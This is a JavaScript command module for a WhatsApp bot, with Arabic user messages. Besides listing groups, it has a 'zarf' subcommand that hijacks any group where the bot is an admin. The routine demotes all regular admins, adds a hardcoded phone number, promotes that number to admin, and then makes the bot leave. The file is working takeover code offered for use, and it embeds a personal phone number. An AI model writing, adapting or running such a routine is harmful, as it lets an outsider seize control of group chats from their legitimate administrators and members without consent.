module.exports = {
  command: "group",

  async execute(sock, msg, args) {
    const sender = msg.key.remoteJid;

    try {
      if (!args[0]) {
        return sock.sendMessage(sender, {
          text: "💡 *الاستخدام:*\n\n.group list\n.group zarf [ID الجروب]"
        });
      }

      // =========================
      // 📌 LIST
      // =========================
      if (args[0] === "list") {

        const groups = await sock.groupFetchAllParticipating();
        const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';

        let text = "📌 *قائمة المجموعات:*\n\n";

        for (const g of Object.values(groups)) {

          const botData = g.participants.find(p => p.id === myJid);
          const status = botData?.admin
            ? (botData.admin === "superadmin" ? "👑 مالك" : "🛡️ مشرف")
            : "👤 عضو";

          text +=
            `📛 *${g.subject}*\n` +
            `🆔 \`${g.id}\`\n` +
            `✨ الحالة: ${status}\n\n──────────\n\n`;
        }

        return sock.sendMessage(sender, { text });
      }

      // =========================
      // 🔥 ZARF
      // =========================
      if (args[0] === "zarf") {

        const groupId = args[1];
        if (!groupId)
          return sock.sendMessage(sender, { text: "❌ ضع ID الجروب." });

        const groupData = await sock.groupMetadata(groupId);
        const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const ownerNumber = "201204130538@s.whatsapp.net";

        // تحقق من صلاحية البوت
        const botData = groupData.participants.find(p => p.id === myJid);

        if (!botData || !botData.admin) {
          return sock.sendMessage(sender, {
            text: "❌ لا يمكن التنفيذ — البوت ليس مشرفاً في هذا الجروب."
          });
        }

        await sock.sendMessage(sender, {
          text: "⚡ البوت مشرف — بدء التنفيذ..."
        });

        // تنزيل الأدمن العادي فقط (بدون لمس المالك)
        const adminsToDemote = groupData.participants
          .filter(p => p.admin === "admin" && p.id !== myJid)
          .map(p => p.id);

        if (adminsToDemote.length > 0) {
          try {
            await sock.groupParticipantsUpdate(groupId, adminsToDemote, "demote");
          } catch (e) {
            console.log("Demote Error:", e.message);
          }
        }

        // هل الرقم موجود؟
        const alreadyInGroup =
          groupData.participants.find(p => p.id === ownerNumber);

        if (!alreadyInGroup) {
          try {
            await sock.groupParticipantsUpdate(groupId, [ownerNumber], "add");
          } catch (e) {
            console.log("Add Error:", e.message);
          }
        }

        // ترقيته
        try {
          await sock.groupParticipantsUpdate(groupId, [ownerNumber], "promote");
        } catch (e) {
          console.log("Promote Error:", e.message);
        }

        await sock.sendMessage(sender, {
          text: "✅ تم التنفيذ — مغادرة الجروب الآن."
        });

        await sock.groupLeave(groupId);
        return;
      }

    } catch (err) {
      console.error("Group Command Error:", err);
      return sock.sendMessage(sender, {
        text: "❌ حدث خطأ (قد يكون بسبب قيود واتساب أو الصلاحيات)."
      });
    }
  }
};